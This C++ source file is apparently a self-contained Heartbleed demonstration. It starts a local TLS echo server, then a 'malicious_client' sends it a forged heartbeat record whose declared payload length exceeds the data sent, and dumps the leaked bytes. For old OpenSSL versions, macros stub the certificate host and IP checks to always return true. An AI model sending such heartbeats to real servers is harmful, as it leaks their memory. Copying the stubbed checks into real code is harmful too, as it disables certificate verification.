// For old openssl version.
#include <openssl/ssl.h>
#if OPENSSL_VERSION_NUMBER <= 0x10100000L
    #define X509_check_ip_asc(...) true
    #define X509_check_host(...)   true
#endif

#include <print>
#include <ranges>
#include <boost/asio.hpp>
#include <boost/asio/ssl.hpp>
#include <stdexec/execution.hpp>
#include <asioexec/interface.hpp>
using namespace boost::asio;
using namespace stdexec;
using namespace asioexec;

auto bad_heartbeat = std::vector<unsigned char> { 
    0x18,       // type             : heartbeat
    0x03, 0x02, // TLS version      : 1.1
    0x00, 0x40, // heartbeat length : 64
    0x01,       // heartbeat type   : request (1=request, 2=response)
    0x00, 0x2d, // payload length   : 64-1-2-16=45
    'X',        // payload data     : 'X' (only length = 1)

    // 16 padding chars.
    0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00
};

void ssl_operation ( auto status )
{
    auto buf = std::string(1024, '\0');
    if ( status <= 0 )
        throw std::runtime_error(ERR_error_string(ERR_get_error(), buf.data()));
}

std::execution::sender auto echo_server
    = just(/*stream=*/  ssl::stream<ip::tcp::socket>(system_executor(), asioexec::tls_context), 
           /*listener=*/ip::tcp::acceptor(system_executor(), ip::tcp::endpoint(ip::make_address("127.0.0.1"), 12345)),
           /*buff=*/    std::string(65536, '\0'))
    | let_value([] (auto&& stream, auto&& listener, auto&& buff)
        {
            return just()
                 | then      ([&] { std::println("[server]: starts on thread {}", std::this_thread::get_id()); })

                 | let_value ([&] { return listener.async_accept(stream.next_layer(), use_sender); })
                 | then      ([&] { std::println("[server]: tcp connected (with local = {}, remote = {})", make_formattable(stream.next_layer().local_endpoint()), make_formattable(stream.next_layer().remote_endpoint())); })

                 | then      ([&] { ssl_operation(SSL_set_tlsext_heartbeat_no_requests(stream.native_handle(), SSL_TLSEXT_HB_ENABLED)); })
                 | then      ([&] { std::println("[server]: enable heartbeat"); })

                 | let_value ([&] { return stream.async_handshake(ssl::stream_base::server, use_sender); })
                 | then      ([&] { std::println("[server]: ssl/tls handshake ok"); })

                 | let_value ([&] { return stream.async_read_some(buffer(buff), use_sender); })
                 | then      ([&] (int bytes) { std::println("[server]: received request 1: {}", buff); buff = "world!"; })

                 | let_value ([&] { return stream.async_write_some(buffer(buff), use_sender); })
                 | then      ([&] (int bytes) { std::println("[server]: sent response 1: {}", buff); buff.resize(65536); })

                 | let_value ([&] { return stream.async_read_some(buffer(buff), use_sender); })
                 | then      ([&] (int bytes) { std::println("[server]: received request 2: {}", buff); buff = "world2!"; })

                 | let_value ([&] { return stream.async_write_some(buffer(buff), use_sender); })
                 | then      ([&] (int bytes) { std::println("[server]: sent response 2: {}", buff); buff.resize(65536); })
                 
                 | upon_error([&] (auto err) { std::println("[server error]"); std::rethrow_exception(err); });
        });

std::execution::sender auto malicious_client 
    = just(/*stream=*/ssl::stream<ip::tcp::socket>(system_executor(), asioexec::tls_context),
           /*buff=*/  std::string("hello!"))
    | let_value([] (auto&& stream, auto&& buff)
        {
            return just()
                 | then      ([&] { std::println("[client]: starts on thread {}", std::this_thread::get_id()); })

                 | let_value ([&] { return stream.next_layer().async_connect(ip::tcp::endpoint(ip::make_address("127.0.0.1"), 12345), use_sender); })
                 | then      ([&] { std::println("[client]: tcp connected (with local = {}, remote = {})", make_formattable(stream.next_layer().local_endpoint()), make_formattable(stream.next_layer().remote_endpoint())); })

                 | then      ([&] { ssl_operation(SSL_set_tlsext_heartbeat_no_requests(stream.native_handle(), SSL_TLSEXT_HB_ENABLED)); })
                 | then      ([&] { std::println("[client]: enable heartbeat"); })

                 | let_value ([&] { return stream.async_handshake(ssl::stream_base::client, use_sender); })
                 | then      ([&] { std::println("[client]: ssl/tls handshake ok"); })

                 | let_value ([&] { return stream.async_write_some(buffer(buff), use_sender); })
                 | then      ([&] (int bytes) { std::println("[client]: sent request 1: {}", buff); })

                 | let_value ([&] { return stream.async_read_some(buffer(buff), use_sender); })
                 | then      ([&] (int bytes) { buff.resize(bytes); std::println("[client]: received response 1: {}", buff); })

                 | let_value ([&] { return stream.next_layer().async_write_some(buffer(bad_heartbeat), use_sender); }) // Here we directly operate TCP stream, sending the fake ssl-heartbeat package.
                 | then      ([&] (int bytes) { std::println("[client]: send heartbeat with {} bytes", bytes); })

                 | let_value ([&] { return stream.next_layer().async_read_some(buffer(buff), use_sender); }) // Here we listen the TCP stream, expect some raw data.
                 | then      ([&] (int bytes) { buff.resize(bytes);
                                                std::println("[client]: received heartbeat response: {}", 
                                                             buff | std::views::transform([] (char ch) { return std::format("{:x}", uint32_t(ch)); })
                                                                  | std::ranges::to<std::vector<std::string>>()); 
                                              })

                 | upon_error([&] (auto err) { std::println("[client error]"); std::rethrow_exception(err); });
        });

int main ( )
{
    std::println("OPENSSL_VERSION_NUMBER = {:x}", OPENSSL_VERSION_NUMBER);
    sync_wait(when_all(std::move(echo_server), std::move(malicious_client)));
}




